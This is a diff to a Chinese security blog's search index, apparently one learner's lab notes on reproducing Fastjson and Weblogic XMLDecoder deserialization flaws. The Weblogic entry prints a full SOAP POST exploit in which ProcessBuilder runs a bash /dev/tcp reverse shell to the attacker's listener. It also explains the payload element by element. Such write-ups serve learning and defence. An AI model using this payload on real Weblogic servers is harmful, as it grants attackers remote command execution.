@@ -3356,6 +3356,13 @@ public function __toString()&#123;
 <p>marshalsec为<a href="https://so.csdn.net/so/search?q=java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">java反序列化</a>利用工具，其中需要kali安装mvn服务进行编译：</p>
 <p>[]: <a href="https://blog.csdn.net/weixin_42250835/article/details/120349852">https://blog.csdn.net/weixin_42250835/article/details/120349852</a>    “踩坑 - Kali下安装配置maven，完美解决！”</p>
 <p><img src="/2023/05/28/2023/5/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/blog\source_posts\2023\5\Fastjson反序列化漏洞复现\image-20230528143919178.png" alt="image-20230528143919178"></p>
+<p>接着参考文章使用bp发包改，但我一直报错400</p>
+<p><img src="/2023/05/28/2023/5/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230529221942483.png" alt="image-20230529221942483"></p>
+<p>改用hackbar插件直接POST发包,页面是到500</p>
+<p><img src="/2023/05/28/2023/5/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230529222317429.png" alt="image-20230529222317429"></p>
+<p>但RMI监听效果仍不尽人意</p>
+<p><img src="/2023/05/28/2023/5/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230529222457298.png" alt="image-20230529222457298"></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/Bossfrank/article/details/130100893">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p>
 ]]></content>
       <categories>
         <category>hvv</category>
@@ -3617,6 +3624,58 @@ public function __toString()&#123;
       </categories>
       <tags>
         <tag>js逆向</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Weblogic-XMLDecoder-反序列化漏洞</title>
+    <url>/2023/05/30/2023/5/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>开启靶场</p>
+<p><img src="/2023/05/30/2023/5/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20230531165631034.png" alt="image-20230531165631034"></p>
+<p>环境</p>
+<p><img src="/2023/05/30/2023/5/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%5Cimage-20230531170438942.png" alt="image-20230531170438942"></p>
+<p>kali攻击机开启监听</p>
+<p><img src="/2023/05/30/2023/5/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%5Cimage-20230531170126774.png" alt="image-20230531170126774"></p>
+<p>bp抓包、改包</p>
+<p><img src="/2023/05/30/2023/5/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%5Cimage-20230531165936980.png" alt="image-20230531165936980"></p>
+<p>数据包</p>
+<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1<br><span class="hljs-attribute">Host</span>: 192.168.174.128:7001<br><span class="hljs-attribute">Cache-Control</span>: max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<br><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<br><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content-Type</span>: text/xml<br><span class="hljs-attribute">Content-Length</span>: 796<br><br>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;  <br>  &lt;soapenv:Header&gt; <br>    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;  <br>        &lt;java class=&quot;java.beans.XMLDecoder&quot;&gt;<br>            &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;<br>                  &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;<br>                    &lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;<br>                    &lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;<br>                    &lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.174.128/6666 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;<br>                &lt;/array&gt;<br>              &lt;void method=&quot;start&quot;&gt;&lt;/void&gt;<br>            &lt;/object&gt;<br>        &lt;/java&gt;<br>    &lt;/work:WorkContext&gt; <br>  &lt;/soapenv:Header&gt;  <br>  &lt;soapenv:Body/&gt; <br>&lt;/soapenv:Envelope&gt;<br></code></pre></td></tr></table></figure>
+
+<p>反弹shell成功</p>
+<p><img src="/2023/05/30/2023/5/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%5Cimage-20230531170208771.png" alt="image-20230531170208771"></p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><img src="/2023/05/30/2023/5/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Weblogic-XMLDecoder-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%5Cimage-20230531170628029.png" alt="image-20230531170628029"></p>
+<p>POC的构造（参考<a href="https://blog.csdn.net/Bossfrank/article/details/130778724%EF%BC%89">https://blog.csdn.net/Bossfrank/article/details/130778724）</a></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/bin/bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash -i <span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span> /dev/tcp/192.168.219.134/4444 0<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span> <br>  <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span>title: Weblogic-XMLDecoder-反序列化漏洞<br></code></pre></td></tr></table></figure>
+
+<p>开头的三行</p>
+<p>末尾的三行主要是SOAP的规范协议，</p>
+<p>SOAP：以XML形式提供了一个简单、轻量的用于在分散或分布环境中交换结构化和类型信息的机制</p>
+<p><strong>java标签</strong></p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp">&lt;java <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>这个标签是使用 XMLEncoder 来生成表示 JavaBeans 组件(bean)的 XML 文档，用 XMLDecoder 读取使用 XMLEncoder 创建的XML文档获取JavaBeans。</p>
+<p><strong>object标签</strong></p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><code class="hljs csharp">&lt;<span class="hljs-keyword">object</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>通过 <object> 标签表示对象， 其class 属性指定具体类(用于调用其内部方法)，此处为ProcessBuilder类，ProcessBuilder可以用于执行cmd命令，调用ProcessBuilder的start()方法启动进程，start将会在后续的标签void进行介绍。</object></p>
+<p><strong>array标签/void标签</strong></p>
+<figure class="highlight typescript"><table><tr><td class="code"><pre><code class="hljs typescript">&lt;array <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> length=<span class="hljs-string">&quot;3&quot;</span>&gt;<br>                    &lt;<span class="hljs-built_in">void</span> index=<span class="hljs-string">&quot;0&quot;</span>&gt;&lt;<span class="hljs-built_in">string</span>&gt;<span class="hljs-regexp">/bin/</span>bash&lt;<span class="hljs-regexp">/string&gt;&lt;/</span><span class="hljs-built_in">void</span>&gt;<br>                    &lt;<span class="hljs-built_in">void</span> index=<span class="hljs-string">&quot;1&quot;</span>&gt;&lt;<span class="hljs-built_in">string</span>&gt;-c&lt;<span class="hljs-regexp">/string&gt;&lt;/</span><span class="hljs-built_in">void</span>&gt;<br>                    &lt;<span class="hljs-built_in">void</span> index=<span class="hljs-string">&quot;2&quot;</span>&gt;&lt;<span class="hljs-built_in">string</span>&gt;bash -i &amp;gt;&amp;amp; <span class="hljs-regexp">/dev/</span>tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.219</span><span class="hljs-number">.134</span>/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&amp;gt;&amp;amp;<span class="hljs-number">1</span>&lt;<span class="hljs-regexp">/string&gt;&lt;/</span><span class="hljs-built_in">void</span>&gt;<br>&lt;/array&gt;<br></code></pre></td></tr></table></figure>
+
+<p>通过 <array> 标签表示数组， class 属性指定具体类，此处为字符串，在array标签内部使用 void 标签的 index 属性来指定数组索引赋值，此处相当于创建了一个长度为3的字符串数组，三个元素的内容分别相当于：</array></p>
+<figure class="highlight lsl"><table><tr><td class="code"><pre><code class="hljs lsl">str[<span class="hljs-number">0</span>] = &#x27;/bin/bash&#x27;<br>str[<span class="hljs-number">1</span>] = &#x27;-c&#x27; <br>str[<span class="hljs-number">2</span>] = &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.219</span><span class="hljs-number">.134</span>/<span class="hljs-number">4444</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>其中str[0]指出了cmd命令的位置，str[1]表示执行，str[2]表示执行的具体命令。注意反弹shell的语句需要进行编码，否则解析XML的时候将出现格式错误 。</p>
+<figure class="highlight oxygene"><table><tr><td class="code"><pre><code class="hljs oxygene">&lt;void <span class="hljs-function"><span class="hljs-keyword">method</span>=&quot;<span class="hljs-title">start</span>&quot;&gt;&lt;/<span class="hljs-title">void</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>void标签中的start方法是前述ProcessBuilder类的一个方法</p>
+<p>调用ProcessBuilder的start()方法可以启动命令执行的进程。</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/Bossfrank/article/details/130778724">https://blog.csdn.net/Bossfrank/article/details/130778724</a></p>
+<p><a href="https://blog.csdn.net/weixin_46684578/article/details/119394819">https://blog.csdn.net/weixin_46684578/article/details/119394819</a></p>
+]]></content>
+      <categories>
+        <category>hvv</category>
+      </categories>
+      <tags>
+        <tag>src</tag>
       </tags>
   </entry>
 </search>
